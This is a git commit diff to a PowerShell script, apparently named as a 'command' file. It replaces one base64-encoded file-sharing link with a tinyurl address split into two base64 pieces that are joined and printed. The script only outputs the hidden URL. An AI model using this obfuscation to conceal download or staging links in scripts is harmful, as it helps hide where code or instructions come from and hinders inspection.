4bf0da72b5521d803001da00e7101e700c7b3fbf
NotJakeFromStateFarm <cyb3rjake@gmail.com>
2024-11-09 14:55:17 -0500

    Update skynet_command_1.ps1

--- skynet_command_1.ps1
+++ skynet_command_1.ps1
@@ -1,2 +1,4 @@
-$part1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9tZWdhLm56L2ZpbGUvc0k0UUhaYUw="))
-Write-Output $part1
+$part1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly90aW55dXJsLmNvbS8="))
+$part2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("M3R0ZjJ3d2U="))
+$output = $part1 + $part2
+Write-Output $output
